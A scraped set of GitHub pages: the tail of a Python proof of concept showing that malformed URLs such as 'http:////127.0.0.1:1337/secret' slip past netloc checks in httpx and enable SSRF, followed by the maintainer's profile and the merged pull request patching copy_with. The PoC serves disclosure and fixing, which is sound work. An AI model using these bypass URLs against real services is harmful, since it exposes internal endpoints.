|  |  |
|  | print("url.path:", url.path) # /to/path |
|  |  |
|  | print("url.query:", url.query) # b'q=a' |
|  |  |
|  | print() |
|  |  |
|  | print("#### Some functions which have the same problem when using 'copy\_with' ####") |
|  |  |
|  | print("httpx.URL('http:////127.0.0.1:1337/to/path?q=a#test').copy\_set\_param('a').netloc:", |
|  | httpx.URL(url).copy\_set\_param("a").netloc) |
|  |  |
|  | print("httpx.URL('http:////127.0.0.1:1337/to/path?q=a#test').copy\_add\_param('a').netloc:", |
|  | httpx.URL(url).copy\_add\_param("a").netloc) |
|  |  |
|  | print("httpx.URL('http:////127.0.0.1:1337/to/path?q=a#test').copy\_remove\_param('a').netloc:", |
|  | httpx.URL(url).copy\_remove\_param("a").netloc) |
|  |  |
|  | print("httpx.URL('http:////127.0.0.1:1337/to/path?q=a#test').copy\_merge\_params('a').netloc:", |
|  | httpx.URL(url).copy\_merge\_params("a").netloc) |
|  |  |
|  | print("httpx.URL('http:////127.0.0.1:1337/to/path?q=a#test', scheme='https').netloc:", |
|  | httpx.URL(url\_str, scheme='https').netloc) # dev only want to change http to https :( |
|  |  |
|  | print() |
|  |  |
|  | print("#### build http request with relative path ####") |
|  |  |
|  | req = httpx.Client(base\_url="https://example.com/A?ignore=").build\_request("ANY\_METHOD", "/B") |
|  |  |
|  | print('req = httpx.Client(base\_url="https://example.com/A?ignore=").build\_request("ANY\_METHOD", "/B")') |
|  |  |
|  | print("req.url.path == '/B'? ans:NO!") |
|  |  |
|  | print("req.url.path:", req.url.path) |
|  |  |
|  | print("req.url.query:", req.url.query) |
|  |  |
|  | print() |
|  |  |
|  | print("#### SSRF if attacker can control 'base\_url' in 'httpx.Client' ####") |
|  |  |
|  | url\_str = "http:////127.0.0.1:1337/secret?q=a&ignore=" |
|  |  |
|  | assert b"127.0.0.1" not in httpx.URL(url\_str).netloc # security check for the PoC |
|  |  |
|  | req = httpx.Client(base\_url=url\_str).build\_request("ANY\_METHOD", "/index.html") |
|  |  |
|  | print("Possible to fetch 'http://127.0.0.1/secret'? ans: YES!") |
|  |  |
|  | print("request url:", req.url) |
|  |  |
|  | print("What if I check netloc of base\_url?") |
|  |  |
|  | if b"127.0.0.1" in httpx.Client(base\_url=url\_str).base\_url.netloc: |
|  | print("Block!", httpx.Client(base\_url=url\_str).base\_url.netloc) |
|  |  |
|  | print("Still possible to bypass the check? ans: YES!") |
|  |  |
|  | url\_str = url\_str + "/" |
|  |  |
|  | assert b"127.0.0.1" not in httpx.URL(url\_str).netloc # bypass 1! |
|  |  |
|  | client = httpx.Client(base\_url=url\_str) |
|  |  |
|  | assert b"127.0.0.1" not in client.base\_url.netloc # bypass 2! |
|  |  |
|  | print("httpx.Client(base\_url='http:////127.0.0.1:1337/secret?q=a&ignore=/').base\_url", client.base\_url) |
|  |  |
|  | req = client.build\_request("ANY\_METHOD", "/index.html") |
|  |  |
|  | print("request url:", req.url) |

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2Flebr0nli%2F4edb76bbd3b5ff993cf44f2fbce5e571)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_9d71bd32_20250115_111925.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftomchristie)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftomchristie)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E&source=header)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

![@tomchristie](https://avatars.githubusercontent.com/u/647359?s=64&v=4)

**tomchristie**
[Follow](/login?return_to=https%3A%2F%2Fgithub.com%2Ftomchristie)

[Overview](/tomchristie)
[Repositories
26](/tomchristie?tab=repositories)
[Projects
0](/tomchristie?tab=projects)
[Packages
0](/tomchristie?tab=packages)
[Stars
584](/tomchristie?tab=stars)
[Sponsoring
1](/tomchristie?tab=sponsoring)

More

* [Overview](/tomchristie)
* [Repositories](/tomchristie?tab=repositories)
* [Projects](/tomchristie?tab=projects)
* [Packages](/tomchristie?tab=packages)
* [Stars](/tomchristie?tab=stars)
* [Sponsoring](/tomchristie?tab=sponsoring)

![@tomchristie](https://avatars.githubusercontent.com/u/647359?s=64&v=4)

**tomchristie**

[Follow](/login?return_to=https%3A%2F%2Fgithub.com%2Ftomchristie)

[![View tomchristie's full-sized avatar](https://avatars.githubusercontent.com/u/647359?v=4)](https://avatars.githubusercontent.com/u/647359?v=4)
🌿

# Tom Christie tomchristie

🌿

[Follow](/login?return_to=https%3A%2F%2Fgithub.com%2Ftomchristie)

★
[3.8k
followers](https://github.com/tomchristie?tab=followers) · [0
following](https://github.com/tomchristie?tab=following)

* Encode OSS
* Brighton, UK
* <http://www.tomchristie.com/>

## Sponsoring

[![@pawamoy](https://avatars.githubusercontent.com/u/3999221?s=70&v=4)](/pawamoy)

## [Achievements](/tomchristie?tab=achievements)

[![Achievement: Public Sponsor](https://github.githubassets.com/assets/public-sponsor-default-9fa68986b057.png)](/tomchristie?achievement=public-sponsor&tab=achievements)[![Achievement: Pair Extraordinaire](https://github.githubassets.com/assets/pair-extraordinaire-default-579438a20e01.png)x3](/tomchristie?achievement=pair-extraordinaire&tab=achievements)[![Achievement: Quickdraw](https://github.githubassets.com/assets/quickdraw-default--light-medium-5450fadcbe37.png)](/tomchristie?achievement=quickdraw&tab=achievements)[![Achievement: YOLO](https://github.githubassets.com/assets/yolo-default-be0bbff04951.png)](/tomchristie?achievement=yolo&tab=achievements)[![Achievement: Galaxy Brain](https://github.githubassets.com/assets/galaxy-brain-default-847262c21056.png)x4](/tomchristie?achievement=galaxy-brain&tab=achievements)[![Achievement: Mars 2020 Contributor](https://github.githubassets.com/assets/mars-2020-contributor-default-c9cad8495acf.png)](/tomchristie?achievement=mars-2020-contributor&tab=achievements)[![Achievement: Arctic Code Vault Contributor](https://github.githubassets.com/assets/arctic-code-vault-contributor-default-df8d74122a06.png)](/tomchristie?achievement=arctic-code-vault-contributor&tab=achievements)[![Achievement: Starstruck](https://github.githubassets.com/assets/starstruck-default--light-medium-65b31ef2251e.png)x4](/tomchristie?achievement=starstruck&tab=achievements)[![Achievement: Pull Shark](https://github.githubassets.com/assets/pull-shark-default-498c279a747d.png)x4](/tomchristie?achievement=pull-shark&tab=achievements)
## [Achievements](/tomchristie?tab=achievements)

[![Achievement: Public Sponsor](https://github.githubassets.com/assets/public-sponsor-default-9fa68986b057.png)](/tomchristie?achievement=public-sponsor&tab=achievements)[![Achievement: Pair Extraordinaire](https://github.githubassets.com/assets/pair-extraordinaire-default-579438a20e01.png)x3](/tomchristie?achievement=pair-extraordinaire&tab=achievements)[![Achievement: Quickdraw](https://github.githubassets.com/assets/quickdraw-default--light-medium-5450fadcbe37.png)](/tomchristie?achievement=quickdraw&tab=achievements)[![Achievement: YOLO](https://github.githubassets.com/assets/yolo-default-be0bbff04951.png)](/tomchristie?achievement=yolo&tab=achievements)[![Achievement: Galaxy Brain](https://github.githubassets.com/assets/galaxy-brain-default-847262c21056.png)x4](/tomchristie?achievement=galaxy-brain&tab=achievements)[![Achievement: Mars 2020 Contributor](https://github.githubassets.com/assets/mars-2020-contributor-default-c9cad8495acf.png)](/tomchristie?achievement=mars-2020-contributor&tab=achievements)[![Achievement: Arctic Code Vault Contributor](https://github.githubassets.com/assets/arctic-code-vault-contributor-default-df8d74122a06.png)](/tomchristie?achievement=arctic-code-vault-contributor&tab=achievements)[![Achievement: Starstruck](https://github.githubassets.com/assets/starstruck-default--light-medium-65b31ef2251e.png)x4](/tomchristie?achievement=starstruck&tab=achievements)[![Achievement: Pull Shark](https://github.githubassets.com/assets/pull-shark-default-498c279a747d.png)x4](/tomchristie?achievement=pull-shark&tab=achievements)
## Highlights

* [Developer Program Member](https://docs.github.com/developers/overview/github-developer-program)
* Pro

## Organizations

[![@django](https://avatars.githubusercontent.com/u/27804?s=64&v=4)](/django) [![@mkdocs](https://avatars.githubusercontent.com/u/9692741?s=64&v=4)](/mkdocs) [![@encode](https://avatars.githubusercontent.com/u/19159390?s=64&v=4)](/encode)

Block or Report

# Block or report tomchristie

**Block user**

Prevent this user from interacting with your repositories and sending you notifications.
Learn more about [blocking users](https://docs.github.com/articles/blocking-a-user-from-your-personal-account).

You must be logged in to block users.

Add an optional note:

Please don't include any personal information such as legal names or email addresses. Maximum 100 characters, markdown supported. This note will be visible to only you.

Block user

**Report abuse**

Contact GitHub support about this user’s behavior.
Learn more about [reporting abuse](https://docs.github.com/articles/reporting-abuse-or-spam).

[Report abuse](/contact/report-abuse?report=tomchristie+%28user%29)

[Overview](/tomchristie)
[Repositories
26](/tomchristie?tab=repositories)
[Projects
0](/tomchristie?tab=projects)
[Packages
0](/tomchristie?tab=packages)
[Stars
584](/tomchristie?tab=stars)
[Sponsoring
1](/tomchristie?tab=sponsoring)

More

* [Overview](/tomchristie)
* [Repositories](/tomchristie?tab=repositories)
* [Projects](/tomchristie?tab=projects)
* [Packages](/tomchristie?tab=packages)
* [Stars](/tomchristie?tab=stars)
* [Sponsoring](/tomchristie?tab=sponsoring)

## Pinned Loading

1. [encode/django-rest-framework](/encode/django-rest-framework) encode/django-rest-framework Public

   Web APIs for Django. 🎸

   Python

   [28.7k](/encode/django-rest-framework/stargazers)
   [6.9k](/encode/django-rest-framework/forks)
2. [mkdocs/mkdocs](/mkdocs/mkdocs) mkdocs/mkdocs Public

   Project documentation with Markdown.

   Python

   [19.7k](/mkdocs/mkdocs/stargazers)
   [2.4k](/mkdocs/mkdocs/forks)
3. [encode/httpx](/encode/httpx) encode/httpx Public

   A next generation HTTP client for Python. 🦋

   Python

   [13.6k](/encode/httpx/stargazers)
   [856](/encode/httpx/forks)
4. [encode/starlette](/encode/starlette) encode/starlette Public

   The little ASGI framework that shines. 🌟

   Python

   [10.5k](/encode/starlette/stargazers)
   [954](/encode/starlette/forks)
5. [encode/uvicorn](/encode/uvicorn) encode/uvicorn Public

   An ASGI web server, for Python. 🦄

   Python

   [8.8k](/encode/uvicorn/stargazers)
   [756](/encode/uvicorn/forks)
6. [encode/databases](/encode/databases) encode/databases Public

   Async database support for Python. 🗄

   Python

   [3.9k](/encode/databases/stargazers)
   [262](/encode/databases/forks)

Something went wrong, please refresh the page to try again.

If the problem persists, check the [GitHub status page](https://www.githubstatus.com/)
or [contact support](/contact).

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_c603a86f_20250115_111929.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fencode%2Fhttpx%2Fpull%2F2185)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fencode%2Fhttpx%2Fpull%2F2185)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=encode%2Fhttpx)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[encode](/encode)
/
**[httpx](/encode/httpx)**
Public

* [Notifications](/login?return_to=%2Fencode%2Fhttpx) You must be signed in to change notification settings
* [Fork
  856](/login?return_to=%2Fencode%2Fhttpx)
* [Star
   13.6k](/login?return_to=%2Fencode%2Fhttpx)

* [Code](/encode/httpx)
* [Issues
  45](/encode/httpx/issues)
* [Pull requests
  34](/encode/httpx/pulls)
* [Discussions](/encode/httpx/discussions)
* [Actions](/encode/httpx/actions)
* [Security](/encode/httpx/security)
* [Insights](/encode/httpx/pulse)

Additional navigation options

* [Code](/encode/httpx)
* [Issues](/encode/httpx/issues)
* [Pull requests](/encode/httpx/pulls)
* [Discussions](/encode/httpx/discussions)
* [Actions](/encode/httpx/actions)
* [Security](/encode/httpx/security)
* [Insights](/encode/httpx/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fencode%2Fhttpx%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fencode%2Fhttpx%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Patch `copy_with` #2185

 Merged

[tomchristie](/tomchristie)
merged 2 commits into
[encode:master](/encode/httpx/tree/master "encode/httpx:master")
from
[lebr0nli:master](/lebr0nli/httpx/tree/master "lebr0nli/httpx:master")

May 3, 2022

 Merged

# [Patch `copy_with`](#top) #2185

[tomchristie](/tomchristie)
merged 2 commits into
[encode:master](/encode/httpx/tree/master "encode/httpx:master")
from
[lebr0nli:master](/lebr0nli/httpx/tree/master "lebr0nli/httpx:master")

May 3, 2022

[Conversation
2](/encode/httpx/pull/2185)
[Commits
2](/encode/httpx/pull/2185/commits)
[Checks
0](/encode/httpx/pull/2185/checks)
[Files changed](/encode/httpx/pull/2185/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![lebr0nli](https://avatars.githubusercontent.com/u/61896187?s=60&v=4)](/lebr0nli)

Copy link

Contributor

### @lebr0nli **[lebr0nli](/lebr0nli)** commented [Apr 21, 2022](#issue-1210457945)

Patch for [#2184](https://github.com/encode/httpx/issues/2184)

Sorry, something went wrong.

 👍
1
 yan12125 reacted with thumbs up emoji

All reactions

* 👍
  1 reaction

 [![@lebr0nli](https://avatars.githubusercontent.com/u/61896187?s=40&u=5dbd8d1119fb216651198811601296a26df51354&v=4)](/lebr0nli)
[lebr0nli](/lebr0nli)
[force-pushed](/encode/httpx/compare/ff7489036a627ea39a5e4b18d86148587d921208..59562821600aaf309b30220b18c9592c74187e53)
the
master

branch
from
[`ff74890`](/encode/httpx/commit/ff7489036a627ea39a5e4b18d86148587d921208) to
[`5956282`](/encode/httpx/commit/59562821600aaf309b30220b18c9592c74187e53)  [Compare](/encode/httpx/compare/ff7489036a627ea39a5e4b18d86148587d921208..59562821600aaf309b30220b18c9592c74187e53)
[April 21, 2022 05:45](#event-6468106046)

[![@lebr0nli](https://avatars.githubusercontent.com/u/61896187?s=40&v=4)](/lebr0nli)

`[Patch copy_with](/encode/httpx/pull/2185/commits/e3c495a32c63d8aa7f1bcf3b7b27ee1a0ff428e1 "Patch `copy_with`")`

`[e3c495a](/encode/httpx/pull/2185/commits/e3c495a32c63d8aa7f1bcf3b7b27ee1a0ff428e1)`

 [![@lebr0nli](https://avatars.githubusercontent.com/u/61896187?s=40&u=5dbd8d1119fb216651198811601296a26df51354&v=4)](/lebr0nli)
[lebr0nli](/lebr0nli)
[force-pushed](/encode/httpx/compare/59562821600aaf309b30220b18c9592c74187e53..e3c495a32c63d8aa7f1bcf3b7b27ee1a0ff428e1)
the
master

branch
from
[`5956282`](/encode/httpx/commit/59562821600aaf309b30220b18c9592c74187e53) to
[`e3c495a`](/encode/httpx/commit/e3c495a32c63d8aa7f1bcf3b7b27ee1a0ff428e1)  [Compare](/encode/httpx/compare/59562821600aaf309b30220b18c9592c74187e53..e3c495a32c63d8aa7f1bcf3b7b27ee1a0ff428e1)
[April 21, 2022 06:23](#event-6468259490)

[![adamserafini](https://avatars.githubusercontent.com/u/1413003?s=60&v=4)](/adamserafini)

**[adamserafini](/adamserafini)**
reviewed
[May 2, 2022](#pullrequestreview-959071549)

 [View reviewed changes](/encode/httpx/pull/2185/files/e3c495a32c63d8aa7f1bcf3b7b27ee1a0ff428e1)

Copy link

### @adamserafini **[adamserafini](/adamserafini)** left a comment

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Would it make sense to add a test for this change?

Sorry, something went wrong.

All reactions

[![@lebr0nli](https://avatars.githubusercontent.com/u/61896187?s=40&v=4)](/lebr0nli)

`[Add a new test for copy_with](/encode/httpx/pull/2185/commits/e77c0ff5ec0f4843f5f8b908d4f9006ec737f0ae "Add a new test for `copy_with`")`

`[e77c0ff](/encode/httpx/pull/2185/commits/e77c0ff5ec0f4843f5f8b908d4f9006ec737f0ae)`

[![@lebr0nli](https://avatars.githubusercontent.com/u/61896187?s=80&u=5dbd8d1119fb216651198811601296a26df51354&v=4)](/lebr0nli)

Copy link

Contributor

Author

### **[lebr0nli](/lebr0nli)** commented [May 2, 2022](#issuecomment-1115085062)

| Would it make sense to add a test for this change?  Yes, it makes sense.  I add a test for `copy_with` in the new commit to ensure `copy_with` won't change any URL property that the user didn't expect.  P.S. I think it's very hard to cover all scenarios, so I focus on preventing the possible attack vectors as far as I know. |
| --- |

 👍
1
 adamserafini reacted with thumbs up emoji

All reactions

* 👍
  1 reaction

Sorry, something went wrong.

[![tomchristie](https://avatars.githubusercontent.com/u/647359?s=60&v=4)](/tomchristie)

**[tomchristie](/tomchristie)**
approved these changes
[May 3, 2022](#pullrequestreview-960184222)

 [View reviewed changes](/encode/httpx/pull/2185/files/e77c0ff5ec0f4843f5f8b908d4f9006ec737f0ae)

[![@tomchristie](https://avatars.githubusercontent.com/u/647359?s=40&u=afcdb67ec485900d025d18270a115085e3f0f909&v=4)](/tomchristie)
[tomchristie](/tomchristie)
merged commit [`e9b0c85`](/encode/httpx/commit/e9b0c85dd4f4e4469c57c4b38e5101fd12081b5c)
into
encode:master

[May 3, 2022](https://github.com/encode/httpx/pull/2185#event-6539756190)

[![@dashk](https://avatars.githubusercontent.com/u/382644?s=40&v=4)](/dashk)
[dashk](/dashk)
mentioned this pull request
[May 7, 2022](#ref-issue-1210457678)

[Some URL can make httpx use URL with wrong info
#2184](/encode/httpx/issues/2184)

Closed

[![@tomchristie](https://avatars.githubusercontent.com/u/647359?s=40&u=afcdb67ec485900d025d18270a115085e3f0f909&v=4)](/tomchristie)
[tomchristie](/tomchristie)
mentioned this pull request
[May 9, 2022](#ref-pullrequest-1229497678)

[Version 0.23.0
#2214](/encode/httpx/pull/2214)
 Merged

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fencode%2Fhttpx%2Fpull%2F2185)

Reviewers

[![@adamserafini](https://avatars.githubusercontent.com/u/1413003?s=40&v=4)](/adamserafini) [adamserafini](/adamserafini)

adamserafini left review comments

[![@tomchristie](https://avatars.githubusercontent.com/u/647359?s=40&v=4)](/tomchristie) [tomchristie](/tomchristie)

tomchristie approved these changes

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

Successfully merging this pull request may close these issues.

3 participants

[![@lebr0nli](https://avatars.githubusercontent.com/u/61896187?s=52&v=4)](/lebr0nli) [![@tomchristie](https://avatars.githubusercontent.com/u/647359?s=52&v=4)](/tomchristie) [![@adamserafini](https://avatars.githubusercontent.com/u/1413003?s=52&v=4)](/adamserafini)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_786169ee_20250115_111924.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fencode%2Fhttpx%2Fcommit%2Fe9b0c85dd4f4e4469c57c4b38e5101fd12081b5c)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

